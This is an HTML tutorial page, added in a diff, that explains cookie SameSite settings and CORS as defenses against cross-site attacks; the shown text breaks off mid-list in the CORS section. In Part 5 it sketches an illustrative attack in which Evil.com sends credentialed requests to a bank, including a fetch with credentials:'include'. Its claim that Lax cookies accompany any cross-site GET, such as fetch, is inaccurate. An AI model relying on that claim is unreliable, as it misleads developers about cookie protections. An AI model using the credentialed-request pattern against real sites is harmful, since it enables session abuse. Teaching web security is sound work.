@@ -1,0 +1,1041 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Web development learning resources and documentation">
+      
+      
+        <meta name="author" content="Your Name">
+      
+      
+      
+      
+      
+        
+      
+      
+      <link rel="icon" href="assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0">
+    
+    
+      
+        <title>30 Days of Web Dev</title>
+      
+    
+    
+      <link rel="stylesheet" href="assets/stylesheets/main.618322db.min.css">
+      
+        
+        <link rel="stylesheet" href="assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL(".",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="blue">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#part-1-the-cookie-configuration-you-copy-paste" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="." title="30 Days of Web Dev" class="md-header__button md-logo" aria-label="30 Days of Web Dev" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            30 Days of Web Dev
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Home
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="blue" data-md-color-accent="blue"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="blue" data-md-color-accent="blue"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/yourusername/30DaysOfWebDev" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    30DaysOfWebDev
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    
+  
+  
+    <li class="md-tabs__item md-tabs__item--active">
+      <a href="." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="." title="30 Days of Web Dev" class="md-nav__button md-logo" aria-label="30 Days of Web Dev" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    30 Days of Web Dev
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/yourusername/30DaysOfWebDev" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
+  </div>
+  <div class="md-source__repository">
+    30DaysOfWebDev
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="." class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#part-1-the-cookie-configuration-you-copy-paste" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Part 1: The Cookie Configuration You Copy-Paste
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-2-samesite-the-first-line-of-defense" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Part 2 — SameSite: the first line of defense
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Part 2 — SameSite: the first line of defense">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#samesitestrict" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SameSite=Strict
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#samesitelax" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SameSite=Lax
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#samesitenone" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SameSite=None
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SameSite=None">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#faq-what-happens-when-i-visit-bcom-does-the-browser-attach-acom-cookies-to-bcom" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FAQ: What happens when I visit B.com — does the browser attach A.com cookies to B.com?
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-3-the-loophole-in-lax-why-we-need-more" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Part 3 — The loophole in Lax (why we need more)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-5-cors-the-second-layer-for-get-requests" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Part 5 — CORS: the second layer for GET requests
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Part 5 — CORS: the second layer for GET requests">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-is-origin-same-origin-policy-sop" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What is Origin (Same Origin Policy — SOP)?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cors-controlled-relaxation-of-sop" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CORS: controlled relaxation of SOP
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-7-samesite-vs-cors-the-complete-picture" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Part 7 — SameSite vs CORS — the complete picture
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Part 7 — SameSite vs CORS — the complete picture">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#examples" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Examples
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#defense-in-depth-use-both" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Defense in depth: use both
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#important-clarification" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Important clarification
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#part-1-the-cookie-configuration-you-copy-paste" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Part 1: The Cookie Configuration You Copy-Paste
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-2-samesite-the-first-line-of-defense" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Part 2 — SameSite: the first line of defense
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Part 2 — SameSite: the first line of defense">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#samesitestrict" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SameSite=Strict
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#samesitelax" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SameSite=Lax
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#samesitenone" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SameSite=None
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SameSite=None">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#faq-what-happens-when-i-visit-bcom-does-the-browser-attach-acom-cookies-to-bcom" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        FAQ: What happens when I visit B.com — does the browser attach A.com cookies to B.com?
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-3-the-loophole-in-lax-why-we-need-more" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Part 3 — The loophole in Lax (why we need more)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-5-cors-the-second-layer-for-get-requests" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Part 5 — CORS: the second layer for GET requests
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Part 5 — CORS: the second layer for GET requests">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-is-origin-same-origin-policy-sop" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What is Origin (Same Origin Policy — SOP)?
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cors-controlled-relaxation-of-sop" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CORS: controlled relaxation of SOP
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#part-7-samesite-vs-cors-the-complete-picture" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Part 7 — SameSite vs CORS — the complete picture
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Part 7 — SameSite vs CORS — the complete picture">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#examples" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Examples
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#defense-in-depth-use-both" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Defense in depth: use both
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#important-clarification" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Important clarification
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h2 id="part-1-the-cookie-configuration-you-copy-paste">Part 1: The Cookie Configuration You Copy-Paste<a class="headerlink" href="#part-1-the-cookie-configuration-you-copy-paste" title="Permanent link">&para;</a></h2>
+<p>You've seen this code everywhere:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nx">res</span><span class="p">.</span><span class="nx">cookie</span><span class="p">(</span><span class="s1">&#39;sessionId&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">token</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="w">    </span><span class="nx">httpOnly</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">    </span><span class="nx">secure</span><span class="o">:</span><span class="w"> </span><span class="nx">isProduction</span><span class="p">,</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="w">    </span><span class="nx">sameSite</span><span class="o">:</span><span class="w"> </span><span class="nx">isProduction</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="s1">&#39;none&#39;</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;lax&#39;</span><span class="p">,</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="w">    </span><span class="nx">maxAge</span><span class="o">:</span><span class="w"> </span><span class="mf">3600000</span><span class="p">,</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="w">    </span><span class="nx">domain</span><span class="o">:</span><span class="w"> </span><span class="nx">isProduction</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="s1">&#39;.yourdomain.com&#39;</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="kc">undefined</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="p">});</span>
+</code></pre></div>
+<p><strong>But what is each line actually preventing?</strong> Let's reverse engineer it.</p>
+<h1 id="part-2-samesite-the-first-line-of-defense">Part 2 — <code>SameSite</code>: the first line of defense<a class="headerlink" href="#part-2-samesite-the-first-line-of-defense" title="Permanent link">&para;</a></h1>
+<p><code>SameSite</code> controls <strong>when a cookie is sent</strong> by the browser.</p>
+<blockquote>
+<p>A cookie is the browser token a website uses to identify you.</p>
+</blockquote>
+<h2 id="samesitestrict"><code>SameSite=Strict</code><a class="headerlink" href="#samesitestrict" title="Permanent link">&para;</a></h2>
+<p>Cookies are sent <strong>only</strong> for same-site requests.</p>
+<ul>
+<li>Requests from <code>A.com</code> → <code>A.com</code> include Cookie A.</li>
+<li>Any request from <code>B.com</code> → <code>A.com</code> <strong>does not</strong> include Cookie A (cross-site requests are blocked).</li>
+</ul>
+<p>Examples:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>A.com / POST ---(Cookie A)---&gt; A.com    // Cookie sent
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>B.com / GET ---(X Cookie A)---&gt; A.com   // Cookie NOT sent (cross-site)
+</code></pre></div>
+<p>Cross-site actions (requests initiated from another site) will not have the cookie attached when <code>SameSite=Strict</code>.</p>
+<hr />
+<h2 id="samesitelax"><code>SameSite=Lax</code><a class="headerlink" href="#samesitelax" title="Permanent link">&para;</a></h2>
+<p><code>Lax</code> is more permissive than <code>Strict</code>:</p>
+<ul>
+<li>Same-site requests: cookie is sent.</li>
+<li>Some cross-site <strong>safe top-level navigations</strong> (e.g., user clicking a normal link) will include the cookie.</li>
+<li>Cross-site non-GET requests (POST, PUT, etc.) <strong>will not</strong> include the cookie.</li>
+</ul>
+<p>Examples:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>A.com / POST ---(Cookie A)---&gt; A.com    // Cookie sent (same site)
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>// Cross-site GET via user navigation (link click)
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>B.com (link to A.com) ---(Cookie A)---&gt; A.com   // Cookie sent
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>// Cross-site POST form submission
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>B.com / POST ---(X Cookie A)---&gt; A.com  // Cookie NOT sent
+</code></pre></div>
+<blockquote>
+<p>Under <code>SameSite=Lax</code>, a site like <code>B.com</code> can trigger a <strong>GET</strong> to <code>A.com</code> that will include <code>A.com</code>’s cookie — this can leak session-related capabilities. We’ll cover additional protections below.</p>
+</blockquote>
+<hr />
+<h2 id="samesitenone"><code>SameSite=None</code><a class="headerlink" href="#samesitenone" title="Permanent link">&para;</a></h2>
+<p>Cookies are sent in <strong>all contexts</strong> (both same-site and cross-site), <strong>but</strong> <code>Secure</code> <strong>must</strong> also be set (cookie is sent only over HTTPS).</p>
+<p>Examples:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>B.com / GET ---(Cookie A)---&gt; A.com   // Cookie sent
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>B.com / POST ---(Cookie A)---&gt; A.com  // Cookie sent
+</code></pre></div>
+<hr />
+<h3 id="faq-what-happens-when-i-visit-bcom-does-the-browser-attach-acom-cookies-to-bcom">FAQ: What happens when I visit <code>B.com</code> — does the browser attach <code>A.com</code> cookies to <code>B.com</code>?<a class="headerlink" href="#faq-what-happens-when-i-visit-bcom-does-the-browser-attach-acom-cookies-to-bcom" title="Permanent link">&para;</a></h3>
+<p>Nothing special happens. Browsers only attach cookies that belong to the domain being requested. When you visit <code>B.com</code>, the browser will only look up and attach cookies for <code>B.com</code>. <code>A.com</code> cookies are not visible or accessible when browsing <code>B.com</code>.</p>
+<hr />
+<h1 id="part-3-the-loophole-in-lax-why-we-need-more">Part 3 — The loophole in <code>Lax</code> (why we need more)<a class="headerlink" href="#part-3-the-loophole-in-lax-why-we-need-more" title="Permanent link">&para;</a></h1>
+<p><strong>Problem:</strong> <code>SameSite: Lax</code> allows certain cross-site GET requests to include cookies. That means an attacker can sometimes trigger reads (GETs) that carry your session cookie. To prevent data theft, we need another layer of protection.</p>
+<hr />
+<h1 id="part-5-cors-the-second-layer-for-get-requests">Part 5 — CORS: the second layer for GET requests<a class="headerlink" href="#part-5-cors-the-second-layer-for-get-requests" title="Permanent link">&para;</a></h1>
+<p>As noted above, under <code>SameSite=Lax</code> a cross-site GET can include cookies. An attacker <strong>can</strong> trigger a GET to your site and the request will reach the server and be processed. But modern browsers implement <strong>CORS</strong> to prevent unauthorized websites from <strong>reading</strong> those responses.</p>
+<p>Example attack (under SameSite: lax):</p>
+<p><img alt="CORS mechanism diagram showing how browser blocks cross-origin requests" src="images/cors-mechanism-diagram.png" /></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>Evil.com ---(Cookie A) /GET balance---&gt; Bank.com
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>Evil.com ---(Cookie A) /GET messages---&gt; Facebook.com
+</code></pre></div>
+<p>A fetch example:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;https://mybank.com/account-balance&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="w">  </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;GET&#39;</span><span class="p">,</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="w">  </span><span class="nx">credentials</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;include&#39;</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="p">});</span>
+</code></pre></div>
+<p>CORS behavior:</p>
+<ul>
+<li>The request reaches the server.</li>
+<li>The server processes it and returns a response.</li>
